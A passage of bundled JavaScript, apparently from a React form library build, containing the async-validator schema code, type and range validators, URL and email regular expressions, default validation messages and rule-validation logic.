          },
        })),
        _setPrototypeOf(tt, s)
      );
    }),
    _wrapNativeSuper(i)
  );
}
var formatRegExp = /%[sdj%]/g,
  warning = function () {};
function convertFieldsError(i) {
  if (!i || !i.length) return null;
  var a = {};
  return (
    i.forEach(function (o) {
      var s = o.field;
      (a[s] = a[s] || []), a[s].push(o);
    }),
    a
  );
}
function format(i) {
  for (
    var a = arguments.length, o = new Array(a > 1 ? a - 1 : 0), s = 1;
    s < a;
    s++
  )
    o[s - 1] = arguments[s];
  var tt = 0,
    nt = o.length;
  if (typeof i == "function") return i.apply(null, o);
  if (typeof i == "string") {
    var ot = i.replace(formatRegExp, function (st) {
      if (st === "%%") return "%";
      if (tt >= nt) return st;
      switch (st) {
        case "%s":
          return String(o[tt++]);
        case "%d":
          return Number(o[tt++]);
        case "%j":
          try {
            return JSON.stringify(o[tt++]);
          } catch {
            return "[Circular]";
          }
          break;
        default:
          return st;
      }
    });
    return ot;
  }
  return i;
}
function isNativeStringType(i) {
  return (
    i === "string" ||
    i === "url" ||
    i === "hex" ||
    i === "email" ||
    i === "date" ||
    i === "pattern"
  );
}
function isEmptyValue(i, a) {
  return !!(
    i == null ||
    (a === "array" && Array.isArray(i) && !i.length) ||
    (isNativeStringType(a) && typeof i == "string" && !i)
  );
}
function asyncParallelArray(i, a, o) {
  var s = [],
    tt = 0,
    nt = i.length;
  function ot(st) {
    s.push.apply(s, _toConsumableArray(st || [])), tt++, tt === nt && o(s);
  }
  i.forEach(function (st) {
    a(st, ot);
  });
}
function asyncSerialArray(i, a, o) {
  var s = 0,
    tt = i.length;
  function nt(ot) {
    if (ot && ot.length) {
      o(ot);
      return;
    }
    var st = s;
    (s = s + 1), st < tt ? a(i[st], nt) : o([]);
  }
  nt([]);
}
function flattenObjArr(i) {
  var a = [];
  return (
    Object.keys(i).forEach(function (o) {
      a.push.apply(a, _toConsumableArray(i[o] || []));
    }),
    a
  );
}
var AsyncValidationError = (function (i) {
  _inherits(o, i);
  var a = _createSuper(o);
  function o(s, tt) {
    var nt;
    return (
      _classCallCheck(this, o),
      (nt = a.call(this, "Async Validation Error")),
      _defineProperty$1(_assertThisInitialized(nt), "errors", void 0),
      _defineProperty$1(_assertThisInitialized(nt), "fields", void 0),
      (nt.errors = s),
      (nt.fields = tt),
      nt
    );
  }
  return _createClass(o);
})(_wrapNativeSuper(Error));
function asyncMap(i, a, o, s, tt) {
  if (a.first) {
    var nt = new Promise(function (vt, _t) {
      var Et = function (bt) {
          return (
            s(bt),
            bt.length
              ? _t(new AsyncValidationError(bt, convertFieldsError(bt)))
              : vt(tt)
          );
        },
        Ct = flattenObjArr(i);
      asyncSerialArray(Ct, o, Et);
    });
    return (
      nt.catch(function (vt) {
        return vt;
      }),
      nt
    );
  }
  var ot = a.firstFields === !0 ? Object.keys(i) : a.firstFields || [],
    st = Object.keys(i),
    ft = st.length,
    ht = 0,
    gt = [],
    St = new Promise(function (vt, _t) {
      var Et = function (Pt) {
        if ((gt.push.apply(gt, Pt), ht++, ht === ft))
          return (
            s(gt),
            gt.length
              ? _t(new AsyncValidationError(gt, convertFieldsError(gt)))
              : vt(tt)
          );
      };
      st.length || (s(gt), vt(tt)),
        st.forEach(function (Ct) {
          var Pt = i[Ct];
          ot.indexOf(Ct) !== -1
            ? asyncSerialArray(Pt, o, Et)
            : asyncParallelArray(Pt, o, Et);
        });
    });
  return (
    St.catch(function (vt) {
      return vt;
    }),
    St
  );
}
function isErrorObj(i) {
  return !!(i && i.message !== void 0);
}
function getValue(i, a) {
  for (var o = i, s = 0; s < a.length; s++) {
    if (o == null) return o;
    o = o[a[s]];
  }
  return o;
}
function complementError(i, a) {
  return function (o) {
    var s;
    return (
      i.fullFields
        ? (s = getValue(a, i.fullFields))
        : (s = a[o.field || i.fullField]),
      isErrorObj(o)
        ? ((o.field = o.field || i.fullField), (o.fieldValue = s), o)
        : {
            message: typeof o == "function" ? o() : o,
            fieldValue: s,
            field: o.field || i.fullField,
          }
    );
  };
}
function deepMerge(i, a) {
  if (a) {
    for (var o in a)
      if (a.hasOwnProperty(o)) {
        var s = a[o];
        _typeof(s) === "object" && _typeof(i[o]) === "object"
          ? (i[o] = _objectSpread2$1(_objectSpread2$1({}, i[o]), s))
          : (i[o] = s);
      }
  }
  return i;
}
var ENUM$1 = "enum",
  enumerable$1 = function (a, o, s, tt, nt) {
    (a[ENUM$1] = Array.isArray(a[ENUM$1]) ? a[ENUM$1] : []),
      a[ENUM$1].indexOf(o) === -1 &&
        tt.push(format(nt.messages[ENUM$1], a.fullField, a[ENUM$1].join(", ")));
  },
  pattern$2 = function (a, o, s, tt, nt) {
    if (a.pattern) {
      if (a.pattern instanceof RegExp)
        (a.pattern.lastIndex = 0),
          a.pattern.test(o) ||
            tt.push(
              format(nt.messages.pattern.mismatch, a.fullField, o, a.pattern)
            );
      else if (typeof a.pattern == "string") {
        var ot = new RegExp(a.pattern);
        ot.test(o) ||
          tt.push(
            format(nt.messages.pattern.mismatch, a.fullField, o, a.pattern)
          );
      }
    }
  },
  range = function (a, o, s, tt, nt) {
    var ot = typeof a.len == "number",
      st = typeof a.min == "number",
      ft = typeof a.max == "number",
      ht = /[\uD800-\uDBFF][\uDC00-\uDFFF]/g,
      gt = o,
      St = null,
      vt = typeof o == "number",
      _t = typeof o == "string",
      Et = Array.isArray(o);
    if (
      (vt ? (St = "number") : _t ? (St = "string") : Et && (St = "array"), !St)
    )
      return !1;
    Et && (gt = o.length),
      _t && (gt = o.replace(ht, "_").length),
      ot
        ? gt !== a.len &&
          tt.push(format(nt.messages[St].len, a.fullField, a.len))
        : st && !ft && gt < a.min
        ? tt.push(format(nt.messages[St].min, a.fullField, a.min))
        : ft && !st && gt > a.max
        ? tt.push(format(nt.messages[St].max, a.fullField, a.max))
        : st &&
          ft &&
          (gt < a.min || gt > a.max) &&
          tt.push(format(nt.messages[St].range, a.fullField, a.min, a.max));
  },
  required$1 = function (a, o, s, tt, nt, ot) {
    a.required &&
      (!s.hasOwnProperty(a.field) || isEmptyValue(o, ot || a.type)) &&
      tt.push(format(nt.messages.required, a.fullField));
  },
  urlReg;
const getUrlRegex = function () {
  if (urlReg) return urlReg;
  var i = "[a-fA-F\\d:]",
    a = function (kt) {
      return kt && kt.includeBoundaries
        ? "(?:(?<=\\s|^)(?=".concat(i, ")|(?<=").concat(i, ")(?=\\s|$))")
        : "";
    },
    o =
      "(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)){3}",
    s = "[a-fA-F\\d]{1,4}",
    tt = [
      "(?:".concat(s, ":){7}(?:").concat(s, "|:)"),
      "(?:".concat(s, ":){6}(?:").concat(o, "|:").concat(s, "|:)"),
      "(?:".concat(s, ":){5}(?::").concat(o, "|(?::").concat(s, "){1,2}|:)"),
      "(?:"
        .concat(s, ":){4}(?:(?::")
        .concat(s, "){0,1}:")
        .concat(o, "|(?::")
        .concat(s, "){1,3}|:)"),
      "(?:"
        .concat(s, ":){3}(?:(?::")
        .concat(s, "){0,2}:")
        .concat(o, "|(?::")
        .concat(s, "){1,4}|:)"),
      "(?:"
        .concat(s, ":){2}(?:(?::")
        .concat(s, "){0,3}:")
        .concat(o, "|(?::")
        .concat(s, "){1,5}|:)"),
      "(?:"
        .concat(s, ":){1}(?:(?::")
        .concat(s, "){0,4}:")
        .concat(o, "|(?::")
        .concat(s, "){1,6}|:)"),
      "(?::(?:(?::"
        .concat(s, "){0,5}:")
        .concat(o, "|(?::")
        .concat(s, "){1,7}|:))"),
    ],
    nt = "(?:%[0-9a-zA-Z]{1,})?",
    ot = "(?:".concat(tt.join("|"), ")").concat(nt),
    st = new RegExp("(?:^".concat(o, "$)|(?:^").concat(ot, "$)")),
    ft = new RegExp("^".concat(o, "$")),
    ht = new RegExp("^".concat(ot, "$")),
    gt = function (kt) {
      return kt && kt.exact
        ? st
        : new RegExp(
            "(?:"
              .concat(a(kt))
              .concat(o)
              .concat(a(kt), ")|(?:")
              .concat(a(kt))
              .concat(ot)
              .concat(a(kt), ")"),
            "g"
          );
    };
  (gt.v4 = function ($t) {
    return $t && $t.exact
      ? ft
      : new RegExp("".concat(a($t)).concat(o).concat(a($t)), "g");
  }),
    (gt.v6 = function ($t) {
      return $t && $t.exact
        ? ht
        : new RegExp("".concat(a($t)).concat(ot).concat(a($t)), "g");
    });
  var St = "(?:(?:[a-z]+:)?//)",
    vt = "(?:\\S+(?::\\S*)?@)?",
    _t = gt.v4().source,
    Et = gt.v6().source,
    Ct = "(?:(?:[a-z\\u00a1-\\uffff0-9][-_]*)*[a-z\\u00a1-\\uffff0-9]+)",
    Pt = "(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*",
    bt = "(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))",
    xt = "(?::\\d{2,5})?",
    yt = '(?:[/?#][^\\s"]*)?',
    wt = "(?:"
      .concat(St, "|www\\.)")
      .concat(vt, "(?:localhost|")
      .concat(_t, "|")
      .concat(Et, "|")
      .concat(Ct)
      .concat(Pt)
      .concat(bt, ")")
      .concat(xt)
      .concat(yt);
  return (urlReg = new RegExp("(?:^".concat(wt, "$)"), "i")), urlReg;
};
var pattern$1 = {
    email:
      /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+\.)+[a-zA-Z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]{2,}))$/,
    hex: /^#?([a-f0-9]{6}|[a-f0-9]{3})$/i,
  },
  types = {
    integer: function (a) {
      return types.number(a) && parseInt(a, 10) === a;
    },
    float: function (a) {
      return types.number(a) && !types.integer(a);
    },
    array: function (a) {
      return Array.isArray(a);
    },
    regexp: function (a) {
      if (a instanceof RegExp) return !0;
      try {
        return !!new RegExp(a);
      } catch {
        return !1;
      }
    },
    date: function (a) {
      return (
        typeof a.getTime == "function" &&
        typeof a.getMonth == "function" &&
        typeof a.getYear == "function" &&
        !isNaN(a.getTime())
      );
    },
    number: function (a) {
      return isNaN(a) ? !1 : typeof a == "number";
    },
    object: function (a) {
      return _typeof(a) === "object" && !types.array(a);
    },
    method: function (a) {
      return typeof a == "function";
    },
    email: function (a) {
      return (
        typeof a == "string" && a.length <= 320 && !!a.match(pattern$1.email)
      );
    },
    url: function (a) {
      return (
        typeof a == "string" && a.length <= 2048 && !!a.match(getUrlRegex())
      );
    },
    hex: function (a) {
      return typeof a == "string" && !!a.match(pattern$1.hex);
    },
  },
  type$1 = function (a, o, s, tt, nt) {
    if (a.required && o === void 0) {
      required$1(a, o, s, tt, nt);
      return;
    }
    var ot = [
        "integer",
        "float",
        "array",
        "regexp",
        "object",
        "method",
        "email",
        "number",
        "date",
        "url",
        "hex",
      ],
      st = a.type;
    ot.indexOf(st) > -1
      ? types[st](o) ||
        tt.push(format(nt.messages.types[st], a.fullField, a.type))
      : st &&
        _typeof(o) !== a.type &&
        tt.push(format(nt.messages.types[st], a.fullField, a.type));
  },
  whitespace$1 = function (a, o, s, tt, nt) {
    (/^\s+$/.test(o) || o === "") &&
      tt.push(format(nt.messages.whitespace, a.fullField));
  };
const rules = {
  required: required$1,
  whitespace: whitespace$1,
  type: type$1,
  range,
  enum: enumerable$1,
  pattern: pattern$2,
};
var any = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt);
    }
    s(ot);
  },
  array = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (o == null && !a.required) return s();
      rules.required(a, o, tt, ot, nt, "array"),
        o != null &&
          (rules.type(a, o, tt, ot, nt), rules.range(a, o, tt, ot, nt));
    }
    s(ot);
  },
  boolean = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        o !== void 0 && rules.type(a, o, tt, ot, nt);
    }
    s(ot);
  },
  date = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o, "date") && !a.required) return s();
      if ((rules.required(a, o, tt, ot, nt), !isEmptyValue(o, "date"))) {
        var ft;
        o instanceof Date ? (ft = o) : (ft = new Date(o)),
          rules.type(a, ft, tt, ot, nt),
          ft && rules.range(a, ft.getTime(), tt, ot, nt);
      }
    }
    s(ot);
  },
  ENUM = "enum",
  enumerable = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        o !== void 0 && rules[ENUM](a, o, tt, ot, nt);
    }
    s(ot);
  },
  floatFn = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        o !== void 0 &&
          (rules.type(a, o, tt, ot, nt), rules.range(a, o, tt, ot, nt));
    }
    s(ot);
  },
  integer = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        o !== void 0 &&
          (rules.type(a, o, tt, ot, nt), rules.range(a, o, tt, ot, nt));
    }
    s(ot);
  },
  method = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        o !== void 0 && rules.type(a, o, tt, ot, nt);
    }
    s(ot);
  },
  number = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if ((o === "" && (o = void 0), isEmptyValue(o) && !a.required))
        return s();
      rules.required(a, o, tt, ot, nt),
        o !== void 0 &&
          (rules.type(a, o, tt, ot, nt), rules.range(a, o, tt, ot, nt));
    }
    s(ot);
  },
  object = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        o !== void 0 && rules.type(a, o, tt, ot, nt);
    }
    s(ot);
  },
  pattern = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o, "string") && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        isEmptyValue(o, "string") || rules.pattern(a, o, tt, ot, nt);
    }
    s(ot);
  },
  regexp = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o) && !a.required) return s();
      rules.required(a, o, tt, ot, nt),
        isEmptyValue(o) || rules.type(a, o, tt, ot, nt);
    }
    s(ot);
  },
  required = function (a, o, s, tt, nt) {
    var ot = [],
      st = Array.isArray(o) ? "array" : _typeof(o);
    rules.required(a, o, tt, ot, nt, st), s(ot);
  },
  string = function (a, o, s, tt, nt) {
    var ot = [],
      st = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (st) {
      if (isEmptyValue(o, "string") && !a.required) return s();
      rules.required(a, o, tt, ot, nt, "string"),
        isEmptyValue(o, "string") ||
          (rules.type(a, o, tt, ot, nt),
          rules.range(a, o, tt, ot, nt),
          rules.pattern(a, o, tt, ot, nt),
          a.whitespace === !0 && rules.whitespace(a, o, tt, ot, nt));
    }
    s(ot);
  },
  type = function (a, o, s, tt, nt) {
    var ot = a.type,
      st = [],
      ft = a.required || (!a.required && tt.hasOwnProperty(a.field));
    if (ft) {
      if (isEmptyValue(o, ot) && !a.required) return s();
      rules.required(a, o, tt, st, nt, ot),
        isEmptyValue(o, ot) || rules.type(a, o, tt, st, nt);
    }
    s(st);
  };
const validators = {
  string,
  method,
  number,
  boolean,
  regexp,
  integer,
  float: floatFn,
  array,
  object,
  enum: enumerable,
  pattern,
  date,
  url: type,
  hex: type,
  email: type,
  required,
  any,
};
var Schema = (function () {
  function i(a) {
    _classCallCheck(this, i),
      _defineProperty$1(this, "rules", null),
      _defineProperty$1(this, "_messages", messages),
      this.define(a);
  }
  return (
    _createClass(i, [
      {
        key: "define",
        value: function (o) {
          var s = this;
          if (!o) throw new Error("Cannot configure a schema with no rules");
          if (_typeof(o) !== "object" || Array.isArray(o))
            throw new Error("Rules must be an object");
          (this.rules = {}),
            Object.keys(o).forEach(function (tt) {
              var nt = o[tt];
              s.rules[tt] = Array.isArray(nt) ? nt : [nt];
            });
        },
      },
      {
        key: "messages",
        value: function (o) {
          return (
            o && (this._messages = deepMerge(newMessages(), o)), this._messages
          );
        },
      },
      {
        key: "validate",
        value: function (o) {
          var s = this,
            tt =
              arguments.length > 1 && arguments[1] !== void 0
                ? arguments[1]
                : {},
            nt =
              arguments.length > 2 && arguments[2] !== void 0
                ? arguments[2]
                : function () {},
            ot = o,
            st = tt,
            ft = nt;
          if (
            (typeof st == "function" && ((ft = st), (st = {})),
            !this.rules || Object.keys(this.rules).length === 0)
          )
            return ft && ft(null, ot), Promise.resolve(ot);
          function ht(Et) {
            var Ct = [],
              Pt = {};
            function bt(yt) {
              if (Array.isArray(yt)) {
                var wt;
                Ct = (wt = Ct).concat.apply(wt, _toConsumableArray(yt));
              } else Ct.push(yt);
            }
            for (var xt = 0; xt < Et.length; xt++) bt(Et[xt]);
            Ct.length
              ? ((Pt = convertFieldsError(Ct)), ft(Ct, Pt))
              : ft(null, ot);
          }
          if (st.messages) {
            var gt = this.messages();
            gt === messages && (gt = newMessages()),
              deepMerge(gt, st.messages),
              (st.messages = gt);
          } else st.messages = this.messages();
          var St = {},
            vt = st.keys || Object.keys(this.rules);
          vt.forEach(function (Et) {
            var Ct = s.rules[Et],
              Pt = ot[Et];
            Ct.forEach(function (bt) {
              var xt = bt;
              typeof xt.transform == "function" &&
                (ot === o && (ot = _objectSpread2$1({}, ot)),
                (Pt = ot[Et] = xt.transform(Pt)),
                Pt != null &&
                  (xt.type =
                    xt.type || (Array.isArray(Pt) ? "array" : _typeof(Pt)))),
                typeof xt == "function"
                  ? (xt = { validator: xt })
                  : (xt = _objectSpread2$1({}, xt)),
                (xt.validator = s.getValidationMethod(xt)),
                xt.validator &&
                  ((xt.field = Et),
                  (xt.fullField = xt.fullField || Et),
                  (xt.type = s.getType(xt)),
                  (St[Et] = St[Et] || []),
                  St[Et].push({ rule: xt, value: Pt, source: ot, field: Et }));
            });
          });
          var _t = {};
          return asyncMap(
            St,
            st,
            function (Et, Ct) {
              var Pt = Et.rule,
                bt =
                  (Pt.type === "object" || Pt.type === "array") &&
                  (_typeof(Pt.fields) === "object" ||
                    _typeof(Pt.defaultField) === "object");
              (bt = bt && (Pt.required || (!Pt.required && Et.value))),
                (Pt.field = Et.field);
              function xt(Rt, It) {
                return _objectSpread2$1(
                  _objectSpread2$1({}, It),
                  {},
                  {
                    fullField: "".concat(Pt.fullField, ".").concat(Rt),
                    fullFields: Pt.fullFields
                      ? [].concat(_toConsumableArray(Pt.fullFields), [Rt])
                      : [Rt],
                  }
                );
              }
              function yt() {
                var Rt =
                    arguments.length > 0 && arguments[0] !== void 0
                      ? arguments[0]
                      : [],
                  It = Array.isArray(Rt) ? Rt : [Rt];
                !st.suppressWarning &&
                  It.length &&
                  i.warning("async-validator:", It),
                  It.length &&
                    Pt.message !== void 0 &&
                    (It = [].concat(Pt.message));
                var Ot = It.map(complementError(Pt, ot));
                if (st.first && Ot.length) return (_t[Pt.field] = 1), Ct(Ot);
                if (!bt) Ct(Ot);
                else {
                  if (Pt.required && !Et.value)
                    return (
                      Pt.message !== void 0
                        ? (Ot = []
                            .concat(Pt.message)
                            .map(complementError(Pt, ot)))
                        : st.error &&
                          (Ot = [
                            st.error(
                              Pt,
                              format(st.messages.required, Pt.field)
                            ),
                          ]),
                      Ct(Ot)
                    );
                  var Nt = {};
                  Pt.defaultField &&
                    Object.keys(Et.value).map(function (Wt) {
                      Nt[Wt] = Pt.defaultField;
                    }),
                    (Nt = _objectSpread2$1(
                      _objectSpread2$1({}, Nt),
                      Et.rule.fields
                    ));
                  var zt = {};
                  Object.keys(Nt).forEach(function (Wt) {
                    var Gt = Nt[Wt],
                      Vt = Array.isArray(Gt) ? Gt : [Gt];
                    zt[Wt] = Vt.map(xt.bind(null, Wt));
                  });
                  var Bt = new i(zt);
                  Bt.messages(st.messages),
                    Et.rule.options &&
                      ((Et.rule.options.messages = st.messages),
                      (Et.rule.options.error = st.error)),
                    Bt.validate(Et.value, Et.rule.options || st, function (Wt) {
                      var Gt = [];
                      Ot &&
                        Ot.length &&
                        Gt.push.apply(Gt, _toConsumableArray(Ot)),
                        Wt &&
                          Wt.length &&
                          Gt.push.apply(Gt, _toConsumableArray(Wt)),
                        Ct(Gt.length ? Gt : null);
                    });
                }
              }
              var wt;
              if (Pt.asyncValidator)
                wt = Pt.asyncValidator(Pt, Et.value, yt, Et.source, st);
              else if (Pt.validator) {
                try {
                  wt = Pt.validator(Pt, Et.value, yt, Et.source, st);
                } catch (Rt) {
                  var $t, kt;
                  ($t = (kt = console).error) === null ||
                    $t === void 0 ||
                    $t.call(kt, Rt),
                    st.suppressValidatorError ||
                      setTimeout(function () {
                        throw Rt;
                      }, 0),
                    yt(Rt.message);
                }
                wt === !0
                  ? yt()
                  : wt === !1
                  ? yt(
                      typeof Pt.message == "function"
                        ? Pt.message(Pt.fullField || Pt.field)
                        : Pt.message ||
                            "".concat(Pt.fullField || Pt.field, " fails")
                    )
                  : wt instanceof Array
                  ? yt(wt)
                  : wt instanceof Error && yt(wt.message);
              }
              wt &&
                wt.then &&
                wt.then(
                  function () {
                    return yt();
                  },
                  function (Rt) {
                    return yt(Rt);
                  }
                );
            },
            function (Et) {
              ht(Et);
            },
            ot
          );
        },
      },
      {
        key: "getType",
        value: function (o) {
          if (
            (o.type === void 0 &&
              o.pattern instanceof RegExp &&
              (o.type = "pattern"),
            typeof o.validator != "function" &&
              o.type &&
              !validators.hasOwnProperty(o.type))
          )
            throw new Error(format("Unknown rule type %s", o.type));
          return o.type || "string";
        },
      },
      {
        key: "getValidationMethod",
        value: function (o) {
          if (typeof o.validator == "function") return o.validator;
          var s = Object.keys(o),
            tt = s.indexOf("message");
          return (
            tt !== -1 && s.splice(tt, 1),
            s.length === 1 && s[0] === "required"
              ? validators.required
              : validators[this.getType(o)] || void 0
          );
        },
      },
    ]),
    i
  );
})();
_defineProperty$1(Schema, "register", function (a, o) {
  if (typeof o != "function")
    throw new Error(
      "Cannot register a validator by type, validator is not a function"
    );
  validators[a] = o;
});
_defineProperty$1(Schema, "warning", warning);
_defineProperty$1(Schema, "messages", messages);
_defineProperty$1(Schema, "validators", validators);
var typeTemplate = "'${name}' is not a valid ${type}",
  defaultValidateMessages = {
    default: "Validation error on field '${name}'",
    required: "'${name}' is required",
    enum: "'${name}' must be one of [${enum}]",
    whitespace: "'${name}' cannot be empty",
    date: {
      format: "'${name}' is invalid for format date",
      parse: "'${name}' could not be parsed as date",
      invalid: "'${name}' is invalid date",
    },
    types: {
      string: typeTemplate,
      method: typeTemplate,
      array: typeTemplate,
      object: typeTemplate,
      number: typeTemplate,
      date: typeTemplate,
      boolean: typeTemplate,
      integer: typeTemplate,
      float: typeTemplate,
      regexp: typeTemplate,
      email: typeTemplate,
      url: typeTemplate,
      hex: typeTemplate,
    },
    string: {
      len: "'${name}' must be exactly ${len} characters",
      min: "'${name}' must be at least ${min} characters",
      max: "'${name}' cannot be longer than ${max} characters",
      range: "'${name}' must be between ${min} and ${max} characters",
    },
    number: {
      len: "'${name}' must equal ${len}",
      min: "'${name}' cannot be less than ${min}",
      max: "'${name}' cannot be greater than ${max}",
      range: "'${name}' must be between ${min} and ${max}",
    },
    array: {
      len: "'${name}' must be exactly ${len} in length",
      min: "'${name}' cannot be less than ${min} in length",
      max: "'${name}' cannot be greater than ${max} in length",
      range: "'${name}' must be between ${min} and ${max} in length",
    },
    pattern: { mismatch: "'${name}' does not match pattern ${pattern}" },
  },
  AsyncValidator = Schema;
function replaceMessage(i, a) {
  return i.replace(/\\?\$\{\w+\}/g, function (o) {
    if (o.startsWith("\\")) return o.slice(1);
    var s = o.slice(2, -1);
    return a[s];
  });
}
var CODE_LOGIC_ERROR = "CODE_LOGIC_ERROR";
function validateRule(i, a, o, s, tt) {
  return _validateRule.apply(this, arguments);
}
function _validateRule() {
  return (
    (_validateRule = _asyncToGenerator(
      _regeneratorRuntime().mark(function i(a, o, s, tt, nt) {
        var ot, st, ft, ht, gt, St, vt, _t, Et;
        return _regeneratorRuntime().wrap(
          function (Pt) {
            for (;;)
              switch ((Pt.prev = Pt.next)) {
                case 0:
                  return (
                    (ot = _objectSpread2$1({}, s)),
                    delete ot.ruleIndex,
                    (AsyncValidator.warning = function () {}),
                    ot.validator &&
                      ((st = ot.validator),
                      (ot.validator = function () {
                        try {
                          return st.apply(void 0, arguments);
                        } catch (bt) {
                          return (
                            console.error(bt), Promise.reject(CODE_LOGIC_ERROR)
                          );
                        }
                      })),
                    (ft = null),
                    ot &&
                      ot.type === "array" &&
                      ot.defaultField &&
                      ((ft = ot.defaultField), delete ot.defaultField),
                    (ht = new AsyncValidator(_defineProperty$1({}, a, [ot]))),
                    (gt = merge$1(
                      defaultValidateMessages,
                      tt.validateMessages
                    )),
                    ht.messages(gt),
                    (St = []),
                    (Pt.prev = 10),
                    (Pt.next = 13),
                    Promise.resolve(
                      ht.validate(
                        _defineProperty$1({}, a, o),
                        _objectSpread2$1({}, tt)
                      )
                    )
                  );
                case 13:
                  Pt.next = 18;
                  break;
                case 15:
                  (Pt.prev = 15),
                    (Pt.t0 = Pt.catch(10)),
                    Pt.t0.errors &&
                      (St = Pt.t0.errors.map(function (bt, xt) {
                        var yt = bt.message,
                          wt = yt === CODE_LOGIC_ERROR ? gt.default : yt;
                        return reactExports.isValidElement(wt)
                          ? reactExports.cloneElement(wt, {
                              key: "error_".concat(xt),
                            })
                          : wt;
                      }));
                case 18:
                  if (!(!St.length && ft)) {
                    Pt.next = 23;
                    break;
                  }
                  return (
                    (Pt.next = 21),
                    Promise.all(
                      o.map(function (bt, xt) {
                        return validateRule(
                          "".concat(a, ".").concat(xt),
                          bt,
                          ft,
                          tt,
                          nt
                        );
                      })
                    )
                  );
                case 21:
                  return (
                    (vt = Pt.sent),
                    Pt.abrupt(
                      "return",
                      vt.reduce(function (bt, xt) {
                        return [].concat(
                          _toConsumableArray(bt),
                          _toConsumableArray(xt)
                        );
                      }, [])
                    )
                  );
                case 23:
                  return (
                    (_t = _objectSpread2$1(
                      _objectSpread2$1({}, s),
                      {},
                      { name: a, enum: (s.enum || []).join(", ") },
                      nt
                    )),
                    (Et = St.map(function (bt) {
                      return typeof bt == "string"
                        ? replaceMessage(bt, _t)
                        : bt;
                    })),
                    Pt.abrupt("return", Et)
                  );
                case 26:
                case "end":
                  return Pt.stop();
              }
          },
          i,
          null,
          [[10, 15]]
        );
      })
    )),
    _validateRule.apply(this, arguments)
  );
}
function validateRules(i, a, o, s, tt, nt) {
  var ot = i.join("."),
    st = o
      .map(function (gt, St) {
        var vt = gt.validator,
          _t = _objectSpread2$1(
            _objectSpread2$1({}, gt),
            {},
            { ruleIndex: St }
          );
        return (
          vt &&
            (_t.validator = function (Et, Ct, Pt) {
              var bt = !1,
                xt = function () {
                  for (
                    var $t = arguments.length, kt = new Array($t), Rt = 0;
                    Rt < $t;
                    Rt++
                  )
                    kt[Rt] = arguments[Rt];
                  Promise.resolve().then(function () {
                    warningOnce(
                      !bt,
                      "Your validator function has already return a promise. `callback` will be ignored."
                    ),
                      bt || Pt.apply(void 0, kt);
                  });
                },
                yt = vt(Et, Ct, xt);
              (bt =
                yt &&
                typeof yt.then == "function" &&
                typeof yt.catch == "function"),
                warningOnce(
                  bt,
                  "`callback` is deprecated. Please return a promise instead."
                ),
                bt &&
                  yt
                    .then(function () {
                      Pt();
                    })
                    .catch(function (wt) {
                      Pt(wt || " ");
                    });
            }),
          _t
        );
      })
      .sort(function (gt, St) {
        var vt = gt.warningOnly,
          _t = gt.ruleIndex,
          Et = St.warningOnly,
          Ct = St.ruleIndex;
        return !!vt == !!Et ? _t - Ct : vt ? 1 : -1;
      }),
    ft;
  if (tt === !0)
    ft = new Promise(
      (function () {
        var gt = _asyncToGenerator(
          _regeneratorRuntime().mark(function St(vt, _t) {
            var Et, Ct, Pt;
            return _regeneratorRuntime().wrap(function (xt) {
              for (;;)
                switch ((xt.prev = xt.next)) {
                  case 0:
                    Et = 0;
                  case 1:
                    if (!(Et < st.length)) {
                      xt.next = 12;
                      break;
                    }
                    return (
                      (Ct = st[Et]),
                      (xt.next = 5),
                      validateRule(ot, a, Ct, s, nt)
                    );
                  case 5:
                    if (((Pt = xt.sent), !Pt.length)) {
                      xt.next = 9;
                      break;
                    }
                    return _t([{ errors: Pt, rule: Ct }]), xt.abrupt("return");
                  case 9:
                    (Et += 1), (xt.next = 1);
                    break;
                  case 12:
                    vt([]);
                  case 13:
                  case "end":
                    return xt.stop();
                }
            }, St);
